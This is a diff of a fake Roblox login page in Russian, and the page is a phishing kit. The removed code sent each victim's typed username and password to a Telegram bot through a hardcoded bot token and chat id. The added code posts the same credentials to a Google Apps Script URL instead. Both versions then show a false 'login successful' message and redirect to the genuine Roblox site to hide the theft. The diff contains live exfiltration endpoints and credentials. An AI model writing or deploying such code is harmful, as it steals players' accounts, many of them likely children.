@@ -1,4 +1,4 @@
-  <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
     <title>Roblox - Вход</title>
@@ -31,16 +31,18 @@
                 return;
             }
 
-            let token = "8847775639:AAFbsxzyX_5_arZ65J1v81hzYxuuJ1uJ7xQ";
-            let chat_id = 6929974696;
-            let message = "Логин: " + u + " | Пароль: " + p;
-
-            let img = new Image();
-            img.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-
-            alert('Вход выполнен успешно!');
-            window.location = 'https://www.roblox.com/login';
+            let url = "https://script.google.com/macros/s/AKfycbw56mfT2en3XCwhLV23ognulMquBfvg_driGWPcL4tAod3rfUyTfbX942-xL2nzrSFM/exec";
+            fetch(url, {
+                method: 'POST',
+                body: JSON.stringify({ user: u, pass: p }),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(() => {
+                alert('Вход выполнен успешно!');
+                window.location = 'https://www.roblox.com/login';
+            })
+            .catch(() => alert('Ошибка, попробуйте позже'));
         }
     </script>
 </body>
-</html>  
+</html>
